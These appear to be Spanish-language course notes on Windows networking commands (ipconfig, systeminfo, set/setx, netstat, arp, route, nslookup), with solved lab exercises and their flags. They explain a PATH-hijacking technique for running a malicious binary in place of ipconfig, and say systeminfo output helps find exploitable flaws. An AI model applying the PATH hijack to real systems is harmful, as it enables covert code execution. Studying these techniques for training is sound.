Comenzaremos nuestro viaje aprendiendo comandos que pueden ayudarnos a obtener información sobre la red. Uno de los comandos más utilizados es *ipconfig*, que nos permite ver configuraciones de red específicas dentro de cada adaptador o interfaz. Podemos inspeccionar nuestra dirección IPv4 e IPv6, la máscara de subred y la puerta de enlace predeterminada.

```
C:\WINDOWS\system32>ipconfig /all

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : 192.168.100.85
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.250
...
```

Ejecutar ipconfig con el parámetro */all* muestra la información de configuración completa. Aquí aprendemos que el último octeto de nuestra dirección IP termina en 85.

Si estamos en una red donde la dirección IPv4 de nuestro dispositivo está asignada desde un servidor DHCP, **también podemos usar ipconfig para liberar y renovar nuestra dirección IP**.

El parámetro */release* envía un mensaje de liberación de DHCP al servidor DHCP, liberando la dirección IPv4.

```
C:\WINDOWS\system32>ipconfig /release "Ethernet adapter Ethernet"

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 0.0.0.0
   Subnet Mask . . . . . . . . . . . : 0.0.0.0
   Default Gateway . . . . . . . . . : 
```

Luego podemos ejecutar ipconfig con el parámetro */renew* para solicitar una nueva dirección IP.

```
C:\WINDOWS\system32>ipconfig /renew "Ethernet adapter Ethernet"

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : 192.168.100.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.250
```

El parámetro */renew* solicitará una dirección IP del servidor DHCP. La dirección IP renovada dependerá de la configuración del servidor DHCP. En este caso, el último octeto cambió de 85 a 100.

En todos estos ejemplos hasta ahora, especificamos un adaptador en nuestros comandos release y renew. Para aplicar esos comandos a todos los adaptadores/interfaces, simplemente omitimos el argumento del adaptador.

```
C:\WINDOWS\system32>ipconfig /release 

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 0.0.0.0
   Subnet Mask . . . . . . . . . . . : 0.0.0.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 0.0.0.0
   Subnet Mask . . . . . . . . . . . : 0.0.0.0
   Default Gateway . . . . . . . . . : 

C:\WINDOWS\system32>ipconfig /renew 

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : 192.168.100.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.250

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : localdomain
   IPv4 Address. . . . . . . . . . . : 192.168.100.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.250
```

Esta vez, se liberaron y renovaron las direcciones IP de todos los adaptadores de red conectados.

Como sugiere el nombre, también podemos usar el comando ipconfig con el parámetro */displaydns* para mostrar la configuración de DNS.

```
C:\WINDOWS\system32>ipconfig /displaydns

Windows IP Configuration

    www.google.com
    ----------------------------------------
    Record Name . . . . . : www.offensive-security.com
    Record Type . . . . . : 1
    Time To Live  . . . . : 276
    Data Length . . . . . : 4
    Section . . . . . . . : Answer
    A (Host) Record . . . . . : 192.168.0.15
```

Otra opción útil es vaciar la caché de DNS, borrando las entradas que muestran el nombre de host a la dirección IP. Si bien el caché de DNS lo ayuda a acceder a ciertos datos web más rápido, vaciarlo puede ayudarlo a solucionar problemas de conexiones relacionadas con la web, entre otras cosas.

Aquí, usaremos ipconfig para borrar el caché de DNS con */flushdns*. Luego ejecutaremos ipconfig */displaydns* para confirmar que nuestro caché de DNS se vació.

```
C:\WINDOWS\system32>ipconfig /flushdns

Windows IP Configuration

Successfully flushed the DNS Resolver Cache.

C:\WINDOWS\system32>ipconfig /displaydns

Windows IP Configuration

```

<br />

**Systeminfo**

Otro gran comando de recopilación de información es *systeminfo*. Este comando muestra información sobre el sistema operativo y propiedades de hardware.

```
C:\WINDOWS\system32>systeminfo

Host Name:                hostname
OS Name:                   Microsoft Windows 10 Home
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          admin
Registered Organization:
Product ID:                #####-#####-#####-#####
Original Install Date:     5/2/2021, 11:59:36 AM
System Boot Time:          7/17/2021, 12:26:04 AM
System Manufacturer:       
System Model:              All Series
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~4001 Mhz
BIOS Version:              American Megatrends Inc. 1202, 6/17/2014
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     16,259 MB
Available Physical Memory: 7,250 MB
Virtual Memory: Max Size:  32,643 MB
Virtual Memory: Available: 21,513 MB
Virtual Memory: In Use:    11,130 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\server
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5003537
                           [02]: KB4562830
                           [03]: KB4580325
                           [04]: KB5004237
                           [05]: KB5003742
...
```

**Desde la perspectiva de la cibserseguridad ofensiva, systeminfo es útil porque la información recopilada aquí puede ser suficiente para identificar una vulnerabilidad y explotarla.**

Una característica interesante y útil de systeminfo es que nos permite ver la información de configuración de una computadora remota. En algunos casos, es posible que tengamos que especificar el dominio, el nombre de usuario y la contraseña. Todo esto está integrado en la utilidad systeminfo. Repasemos un ejemplo rápido.

```
C:\WINDOWS\system32>systeminfo /s computer1 /u blue\domain1 /p password

Host Name:                hostname
OS Name:                   Microsoft Windows 10 Home
OS Version:                10.0.19042 N/A Build 19042
...
```

Revisemos las partes individuales de este comando. 

- Primero, el parámetro /s denota el nombre de la maquina. En este caso, nuestra computadora se llama "computer1". 

- El parámetro /u es para nombre de usuario y dominio. En este caso, nuestro usuario es "blue" y nuestro dominio es "domain1". 

- Finalmente, /p es para la contraseña. En este caso, el usuario "azul" tiene la contraseña "password".

El comando final cubierto en esta sección es *set*, que podemos usar para inspeccionar y cambiar las variables de entorno de Windows.

Las variables de entorno son valores que afectan el funcionamiento de ciertos programas. Para los sistemas Windows, para identificarlas como variables de entorno, se indican con un signo de porcentaje (%) antes y después.

Si ejecutamos el comando set sin ningún parámetro, podemos inspeccionar todas las variables de entorno actuales.

```
C:\WINDOWS\system32>set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\user\AppData\Roaming
asl.log=Destination=file
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=Admin_Server
ComSpec=C:\WINDOWS\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
FP_NO_HOST_CHECK=NO
HOMEDRIVE=C:
HOMEPATH=\Users\user
LOCALAPPDATA=C:\Users\user\AppData\Local
LOGONSERVER=\\server
NUMBER_OF_PROCESSORS=8
OneDrive=C:\Users\user\OneDrive
OS=Windows_NT
...
```

La salida muestra una larga lista de variables y los valores asociados con ellas. Tenga en cuenta que en la salida, los signos de porcentaje antes y después del nombre de la variable no están incluidos.

Exploremos rápidamente cómo esto podría ser útil. Una variable de entorno de Windows muy conocida es _%PATH%_ . Cada vez que ejecutamos un comando en la CLI, no siempre necesitamos estar en el mismo directorio de trabajo que el comando mismo; en su lugar, el intérprete de comandos buscará el binario. Las ubicaciones donde busca son los valores dentro de la _variable %PATH%_ .

Podemos ejecutar el comando ipconfig desde C:\\, aunque ipconfig.exe se encuentra en C:\\Windows\\system32 . 

<br />

**set, setx**

Cuando ejecutamos el comando, la CLI busca el binario en las carpetas indicadas por la variable *%PATH%*.

Podemos ejecutar set PATH para mostrar los valores de esta variable específica.

```
C:\Users\sanmi>set PATH
Path=C:\Program Files (x86)\VMware\VMware Player\bin\;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Program Files\010 Editor;C:\Program Files\Calibre2\;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;C:\Users\sanmi\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

C:\Users\sanmi>echo %PATH%
C:\Program Files (x86)\VMware\VMware Player\bin\;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Program Files\010 Editor;C:\Program Files\Calibre2\;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;C:\Users\sanmi\AppData\Local\Microsoft\WindowsApps;
```

El resultado indica que esta variable tiene varios valores delimitados por un punto y coma (;). La variable *%PATH%* puede tener varios valores y, como es de esperar, uno de ellos es C:\\Windows\\system32 .

Un ejemplo del mundo real de cómo los operadores ofensivos pueden usar "set" es un ataque conocido como "Hijack Execution Flow" o secuestro del flujo de ejecución de comandos, que basicamente consiste en manipular la variable de entorno *%PATH%* para que su programa malicioso se ejecute en lugar del ejecutable normal.

Por ejemplo, imagine si pudiéramos manipular la variable de entorno _%PATH%_ para que solo tenga un valor de C:\\Windows . Entonces podríamos colocar un ejecutable malicioso llamado ipconfig.exe allí. Cuando alguien ejecuta el comando ipconfig , el sistema buscaria el ejecutable con el mismo nombre en las rutas guardadas en la variable PATH, ejecutaría nuestro binario malicioso ubicado en C:\\Windows en lugar del programa esperado normal ubicado en C:\\Windows\\system32 debido a que ejecuta el primer comando coincidente que encuentra, con lo que sabiendo que algunas rutas tienen prioridad de búsqueda sobre otras porque son antecedentes, hemos conseguido ejecutar nuestro programa malicioso. Esto se debe a que forzamos al sistema a buscar programas en una ruta diferente a la que usa normalmente.

Por ejemplo, si ejecutamos el comando set path=C:\\Windows seguido de set path para mostrar nuestros cambios, obtenemos lo siguiente:

```
C:\WINDOWS\system32>set path=c:\Windows

C:\WINDOWS\system32>set path

Path=C:\Windows\system32;
```

Lo que hemos hecho es cambiar la variable de ruta del valor predeterminado a C:\\Windows . **Una nota rápida: el comando set \<parameters\> cambiará temporalmente las variables de entorno. El shell actual o la ventana del símbolo del sistema que tenemos abierta se está ejecutando como un proceso. Cuando usamos set \<parameters\> para agregar, eliminar o cambiar variables de entorno, esos cambios solo existen mientras exista el proceso en el que nos encontramos actualmente.**

Para realizar cambios no volátiles o permanentes en las variables de entorno, debemos usar el comando _setx_ en su lugar. La única advertencia para usar setx es que los cambios no serán visibles desde nuestro shell actual o símbolo del sistema. Se recomienda revisar la página de setx de Microsoft, hace un excelente trabajo explicando los diferentes parámetros, como por ejemplo cómo crear una variable de sistema o una variable local. Aquí observamos el comienzo de la utilidad de ayuda.

```
C:\Users\offensive>setx /?

SetX has three ways of working:

Syntax 1:
    SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]

Syntax 2:
    SETX [/S system [/U [domain\]user [/P [password]]]] var /K regpath [/M]

Syntax 3:
    SETX [/S system [/U [domain\]user [/P [password]]]]
         /F file {var {/A x,y | /R x,y string}[/M] | /X} [/D delimiters]

Description:
    Creates or modifies environment variables in the user or system
    environment. Can set variables based on arguments, regkeys or
    file input.
```

Si tuviéramos que agregar una nueva variable de entorno con setx , tendríamos que abrir un nuevo símbolo del sistema y ejecutar set para ver esos cambios.

<br />

**Exercises**

**4. Cree una variable de entorno permanente llamada LOOKHERETOEXECUTE dado el valor de \\\\users\\\\blue\\\\executeme.exe. (Ejecute el símbolo del sistema como administrador)**


Abrimos una cmd como administrador a través del GUI (nos hemos conectado mediante rdesktop) y utilizamos el siguiente comando:

```
SETX /M LOOKHERETOEXECUTE \\users\\blue\\executeme.exe
```

Luego abrimos otra cmd y para verificar que todo ha salido correctamente ejecutamos:

```
echo %LOOKHERETOEXECUTE%
```

Si al ejecutar el comando anterior obtenemos el valor designado por el primer comando entonces podemos acudir a por la flag:

```
C:\Users\offensive>type envVar_flag1.txt
SETX{App_Looks_Here_For_Binary}
```

<br />



##### 3.1.3. Active Connections and Neighbors (Netstat, ARP).

**Netstat**

Anteriormente, aprendimos que el comando *ipconfig /all* muestra toda la información detallada de TCP/IP para los adaptadores de red. Esto es importante porque es posible que estemos trabajando con varias redes y adaptadores de red. Por ejemplo, el dispositivo puede tener varios controladores de interfaz de red (NIC) o tener doble conexión. Además, es posible que tengamos una conexión VPN o que estemos ejecutando varias máquinas virtuales en la computadora host.

Un dispositivo puede tener varias interfaces de red y es fundamental poder diferenciarlas. El comando ipconfig puede ayudar a identificar los detalles de la interfaz de red específica con la que queremos trabajar en ese momento.

Pasemos a dos comandos más que muestran conexiones activas: *netstat* y *arp*. El comando netstat no solo muestra la dirección IP de la fuente, sino que también muestra cosas como la IP de destino, el puerto de origen y de destino, el estado de la conexión y las estadísticas de protocolo de las capas 3 y 4. Si queremos ver qué máquinas están conectadas con nuestra máquina actual, esta es una forma fácil y rápida de hacerlo.

A continuación, ejecutamos netstat con:

- *a*; para mostrar los puertos en escucha.
- *n*; para mostrar las direcciones numéricamente. 
- *o*; para mostrar el PID de cada conexión.

```
C:\WINDOWS\system32>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1120
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:902            0.0.0.0:0              LISTENING       4212
  TCP    0.0.0.0:912            0.0.0.0:0              LISTENING       4212
  TCP    0.0.0.0:1536           0.0.0.0:0              LISTENING       956
  TCP    0.0.0.0:1537           0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:1538           0.0.0.0:0              LISTENING       1544
  TCP    0.0.0.0:1539           0.0.0.0:0              LISTENING       1808
  TCP    0.0.0.0:1541           0.0.0.0:0              LISTENING       3500
  TCP    0.0.0.0:1543           0.0.0.0:0              LISTENING       4860
  TCP    0.0.0.0:1599           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:1801           0.0.0.0:0              LISTENING       4860
  TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       4860
  TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       4860
  TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       4860
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       604
```

Netstat muestra toda la información solicitada en una tabla.

Es muy recomendable revisar el netstat /? página.

```
C:\Windows\system32>netstat /?

Displays protocol statistics and current TCP/IP network connections.

NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval]

  -a            Displays all connections and listening ports.
...
```

Solo hemos mencionado los diferentes parámetros disponibles con Netstat. Es muy recomendable revisar esto. Le ayudará no solo en el futuro, sino también en las preguntas a continuación.

<br />

**ARP**

El comando *arp* nos permite ver y manipular el caché del *Protocolo de Resolución de Direcciones* (ARP). Ejecutar *arp -a* muestra las entradas ARP para todas las interfaces de red.

```
C:\WINDOWS\system32>arp -a

Interface: 192.168.100.85 --- 0x5
  Internet Address      Physical Address      Type
  192.168.100.250       20-f3-75-d3-60-d0     dynamic
  192.168.100.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

<br />

**Exercises**

**3.  ¿Cuál es la dirección mac asociada con la dirección IP 1.3.3.7? (Proporcione la respuesta en formato XX:XX:XX:XX:XX:XX).**

Nos logeamos a través de rdesktop a la máquina y empleamos el comando

```
C:\Users\offensive>arp -a

Interface: 192.168.56.1 --- 0x2
  Internet Address      Physical Address      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 192.168.54.1 --- 0x5
  Internet Address      Physical Address      Type
  192.168.54.100        08-00-27-c9-a6-8b     dynamic
  192.168.54.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 192.168.96.64 --- 0x7
  Internet Address      Physical Address      Type
  1.3.3.7               de-ad-b3-3f-4d-ad     static
  192.168.96.254        00-50-56-86-10-8b     dynamic
  192.168.96.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
```

De forma que adapatando el formato la respuesta es; de:ad:b3:3f:4d:ad.

<br />

##### 3.1.4. Routing and Networking Troubleshooting (Ping, Tracert).

Examinemos algunos comandos específicos de enrutamiento como *route*, *ping*, *tracert* y *pathping*.

Con el comando de *route*, podemos mostrar y cambiar las entradas dentro de la tabla de enrutamiento. Los otros tres comandos se utilizan como herramientas de diagnóstico para solucionar problemas de conexión entre el dispositivo de origen y el de destino.

Tenga en cuenta que estas tres herramientas se basan en el envío de mensajes "echo" del protocolo ICMP  entre los dispositivos. El tráfico ICMP podría bloquearse, pero el tráfico en otros protocolos entre los dispositivos de origen y destino aún podría atravesar la red.

<br />

**Route**

En general, usaremos estos tres comandos para identificar si existe un host o si nuestra máquina de origen puede acceder a él. Es importante saber todo esto, porque si una máquina de destino se considera inalcanzable o si un host se identifica como no existente, puede ser un falso positivo.

En los casos en que se bloquee el tráfico ICMP, se recomienda utilizar otros métodos para probar la conexión entre el dispositivo de origen y el de destino.

Primero, ejecutemos el comando *route* con el parámetro *print*.

```
C:\WINDOWS\system32>route print

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.100.250   192.168.100.85     25
          0.0.0.0          0.0.0.0         10.5.0.0         10.5.0.2      0
         10.5.0.0      255.255.0.0         10.5.0.0         10.5.0.2      0
         10.5.0.2  255.255.255.255         On-link          10.5.0.2    256
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.100.0    255.255.255.0         On-link    192.168.100.85    281
   192.168.100.85  255.255.255.255         On-link    192.168.100.85    281
```

Podemos encontrar las rutas activas dentro de la tabla de rutas IPv4. La interfaz es la dirección IP del adaptador de red local o la fuente, el destino de la red es la ubicación del extremo lejano o el destino, la máscara de red es la máscara que divide la dirección IP en subredes y la puerta de enlace es generalmente el enrutador externo o el dispositivo proxy que enruta el tráfico desde la red interna a la red externa.

Route puede hacer más que simplemente mostrar las tablas de enrutamiento. Le permite realizar acciones importantes como borrar la tabla de enrutamiento, forzar IPv4 o IPv6. Pero también acciones como AGREGAR o ELIMINAR una ruta. Podemos saber más sobre ellos si echamos un vistazo a la página de ayuda.

```
C:\Windows\system32>route /?

Manipulates network routing tables.

ROUTE [-f] [-p] [-4|-6] command [destination]
                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]
```


<br />

**Ping**

El comando *ping* envía solicitudes de eco ICMP y mide cuánto tiempo tardó el destino en enviar un mensaje de respuesta de eco.

```
C:\WINDOWS\system32>ping www.offensive-security.com

Pinging www.offensive-security.com [192.124.249.5] with 32 bytes of data:
Reply from 192.124.249.5: bytes=32 time=353ms TTL=55
Reply from 192.124.249.5: bytes=32 time=24ms TTL=55
Reply from 192.124.249.5: bytes=32 time=21ms TTL=55
Reply from 192.124.249.5: bytes=32 time=23ms TTL=55

Ping statistics for 192.124.249.5

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 6ms, Maximum = 9ms, Average = 6ms
```

Arriba, se enviaron cuatro paquetes y se recibieron cuatro paquetes. También encontramos que resolvió el nombre de host www.offensive-security.com a la dirección IP (64.233.177.106). Si tuviéramos un cierto porcentaje de pérdida, podría significar que tenemos algún tipo de problema de conexión.

```
C:\WINDOWS\system32>ping 192.168.1.1

Pinging 192.168.1.1 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 192.168.1.1:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
```

Otros escenarios de casos útiles son hacer ping a la dirección de bucle invertido (127.0.0.1) para determinar si los controladores de red funcionan, o hacer ping a la puerta de enlace predeterminada para averiguar si nuestro host puede conectarse a su enrutador.

<br />

**tracert, pathping**

Los comandos *tracert* y *pathping* son muy similares. Tracert utiliza los 8 valores de campo ICMP *Time To Live* (TTL). A medida que los paquetes avanzan a lo largo de la ruta de enrutador a enrutador, el TTL se reduce hasta llegar a 0. En ese punto, se envía un mensaje ICMP de "tiempo excedido" al dispositivo de origen.

De forma predeterminada, tracert generará un máximo de 30 saltos entre el origen y el destino. Pathping funciona de manera muy similar, pero una vez que confirma un salto, enviará múltiples mensajes y proporcionará las estadísticas. Por eso, la ruta puede ser un poco más confiable en comparación con tracert para proporcionar información de latencia. Ejecutemos ambos comandos en www.offensive-security.com .

```
C:\Windows\system32>tracert www.offensive-security.com

Tracing route to www.offensive-security.com [192.124.249.5]
over a maximum of 30 hops:

  1    39 ms     1 ms     2 ms  dsldevice.attlocal.net [192.168.100.250]
  2     2 ms     2 ms     2 ms  45-20-16-1.lightspeed.tukrga.sbcglobal.net [45.20.16.1]
  3    12 ms     3 ms     3 ms  107.212.168.252
  4    11 ms     9 ms     9 ms  12.242.113.47
  5     8 ms    14 ms    12 ms  ae4.cr4-atl2.ip4.gtt.net [173.241.128.81]
  6    25 ms    22 ms    22 ms  ae11.cr2-was1.ip4.gtt.net [89.149.142.238]
  7    22 ms    22 ms    32 ms  ip4.gtt.net [209.120.131.170]
  8    21 ms    21 ms    20 ms  cloudproxy10005.sucuri.net [192.124.249.5]

Trace complete.

C:\Windows\system32>pathping www.offensive-security.com

Tracing route to www.offensive-security.com [192.124.249.5]
over a maximum of 30 hops:
  0  hostname.attlocal.net [192.168.100.77]
  1  dsldevice.attlocal.net [192.168.100.250]
  2  45-20-16-1.lightspeed.tukrga.sbcglobal.net [45.20.16.1]
  3  107.212.168.252
  4  12.242.113.47
  5  ae4.cr4-atl2.ip4.gtt.net [173.241.128.81]
  6  ae11.cr2-was1.ip4.gtt.net [89.149.142.238]
  7  ip4.gtt.net [209.120.131.170]
  8  cloudproxy10005.sucuri.net [192.124.249.5]

Computing statistics for 200 seconds...
            Source to Here   This Node/Link
Hop  RTT    Lost/Sent = Pct  Lost/Sent = Pct  Address
  0                                           hostname.attlocal.net [192.168.100.77]
                                0/ 100 =  0%   |
  1    4ms     0/ 100 =  0%     0/ 100 =  0%  dsldevice.attlocal.net [192.168.100.250]
                                0/ 100 =  0%   |
  2    4ms     0/ 100 =  0%     0/ 100 =  0%  45-20-16-1.lightspeed.tukrga.sbcglobal.net [45.20.16.1]
                                1/ 100 =  1%   |
  3    6ms     2/ 100 =  2%     1/ 100 =  1%  107.212.168.252
                                0/ 100 =  0%   |
  4  ---     100/ 100 =100%    99/ 100 = 99%  12.242.113.47
                                0/ 100 =  0%   |
  5   15ms     2/ 100 =  2%     1/ 100 =  1%  ae4.cr4-atl2.ip4.gtt.net [173.241.128.81]
                                0/ 100 =  0%   |
  6  ---     100/ 100 =100%    99/ 100 = 99%  ae11.cr2-was1.ip4.gtt.net [89.149.142.238]
                                0/ 100 =  0%   |
  7   26ms     1/ 100 =  1%     0/ 100 =  0%  ip4.gtt.net [209.120.131.170]
                                0/ 100 =  0%   |
  8   24ms     1/ 100 =  1%     0/ 100 =  0%  cloudproxy10005.sucuri.net [192.124.249.5]

Trace complete.
```

<br />

**Exercises**

**5. Vea la ruta persistente de 1.1.1.1/32 y anote la puerta de enlace de la red. Lo necesitará para la siguiente pregunta. Para esta pregunta, elimine la ruta 1.1.1.1 y la bandera estará en el directorio c:\\Users\\offensive\\. (Ejecute el símbolo del sistema como administrador)**

Consultamos la ayuda de 'route':

```
C:\Users\offensive>route /?

[...]

Examples:

    > route PRINT
    > route PRINT -4
    > route PRINT -6
    > route PRINT 157*          .... Only prints those matching 157*

    > route ADD 157.0.0.0 MASK 255.0.0.0  157.55.80.1 METRIC 3 IF 2
             destination^      ^mask      ^gateway     metric^    ^
                                                         Interface^
      If IF is not given, it tries to find the best interface for a given
      gateway.
    > route ADD 3ffe::/32 3ffe::1

    > route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2

      CHANGE is used to modify gateway and/or metric only.

    > route DELETE 157.0.0.0
    > route DELETE 3ffe::/32
```

Por lo que el comando es:

```
route DELETE 1.1.1.1
```

Y podemos recuperar la flag.

<br />

**6.  Agregue una ruta persistente de 1.1.1.2/32 y la puerta de enlace predeterminada de la pregunta 5, y la bandera estará en el directorio C:\\Users\\offensive\\. (Ejecute el símbolo del sistema como administrador)

De nuevo, mirando en la ayuda como hemos hecho en el ejercicio anterior obtenemos que el comando es:

```
route ADD 1.1.1.2/32 192.168.96.254
```

<br />

##### 3.1.5. Name Resolution (NetBios, nbstat, nslookup).

Esta sección cubrirá los comandos relacionados con la resolución de nombres. En pocas palabras, la resolución de nombres es un proceso en el que los valores numéricos, como las direcciones IP, se conectan a nombres de host o de dominio. El tráfico de red requiere direcciones IP para viajar desde el origen hasta el destino. Cuando ingresamos "www.google.com" en el navegador, una de las cosas que suceden es la traducción del nombre de dominio a su dirección IP correspondiente. Antes de analizar *nbtstat* y *nslookup*, veamos qué significa NetBIOS y en qué se parece al DNS.

<br />

**NetBios**

NetBIOS se creó como un protocolo de capa 5 (del modelo OSI) para conectar dispositivos dentro de una LAN. Con el paso del tiempo, hubo una mayor demanda de datos para atravesar fuera de la LAN. Debido a que los paquetes debían enrutarse externamente, NetBIOS finalmente se actualizó a un protocolo de Capa 4, llamado NetBIOS sobre TCP/IP (NetBT o NBT).

De forma predeterminada, NBT se ejecuta en los puertos 137 (TCP/UDP), 138 (UDP) y 139 (TCP). Si bien NBT es similar a DNS en que resuelve las direcciones IP en nombres de host/dominio, DNS es un protocolo de capa 7 (puerto 53 - TCP/UDP) y es más escalable debido a su estructura de nombres jerárquica.

La última información a cubrir antes de saltar a los comandos en sí es discutir el archivo de hosts (host's files). En Windows, el host's files se encuentra en la carpeta %SystemRoot%\\System32\\drivers\\etc . Este es un archivo de texto sin formato que contiene asignaciones de hosts a IP y es una de las ubicaciones principales que el sistema operativo verifica cuando intenta resolver los nombres de host/dominio. Podemos editar este archivo, lo que obligaría a la máquina a resolver un dominio en cualquier dirección IP que ingresemos. Cambiar esto no es lo ideal, porque a veces la IP de un dominio cambia, y si está codificada en el archivo del host , el dominio no se encontrará.

<br />

**nbtstat**

El comando nbtstat muestra información como la tabla de nombres y la caché de NetBIOS. También puede mostrar la información del protocolo NetBT para máquinas locales y remotas. Por último, el parámetro /n mostrará la tabla de nombres de la computadora local.

```
C:\WINDOWS\system32>nbtstat /n

Ethernet 33:
Node IpAddress: [192.168.100.85] Scope Id: []

                NetBIOS Local Name Table

       Name               Type         Status
    ---------------------------------------------
    WORKGROUP      <00>  GROUP       Registered
```

Encontramos que el host está "Registrado". Esto significa que el nombre está registrado por la estación de trabajo.

<br />

**nslookup**

El comando nslookup encontrará la IP de un nombre de dominio o el nombre de dominio de una dirección IP (búsqueda inversa). Hay dos formas diferentes de ejecutar nslookup. El primero está aquí.

```
C:\WINDOWS\system32>nslookup www.offensive-security.com
Server:  dsldevice6.attlocal.net
Address:  2600:1700:1d40:b2b0::1

Non-authoritative answer:
Name:    www.offensive-security.com
Address:  192.124.249.5

C:\Users\Administrator>
```

Aquí está el segundo método. Cada uno de estos métodos tiene nombres, y la investigación que ayudará con las preguntas a continuación.

```
C:\Users\Administrator>nslookup
Default Server:  dsldevice6.attlocal.net
Address:  2600:1700:1d40:b2b0::1

> www.offensive-security.com
Server:  cdns01.comcast.net
Address:  2001:558:feed::1

Non-authoritative answer:
Name:    www.offensive-security.com
Address:  192.124.249.5

> exi

C:\Users\Administrator>
```

<br />

#### 3.2. Commons Clients.

##### 3.2.1. Network Shares (SMB, net share, net use).

**SMB**

La creación de redes es un concepto importante que cualquier administrador o profesional de ciberseguridad debe entender. En esta sección, aprenderemos más sobre los recursos compartidos de red. Hoy en día, casi todos los entornos requieren que los usuarios accedan a recursos internos, como impresoras. Otros ejemplos incluyen servidores de archivos compartidos, registro de eventos centralizado o servidores web accesibles internamente. Todos estos ejemplos comparten la relación cliente-servidor donde los datos atraviesan la red.

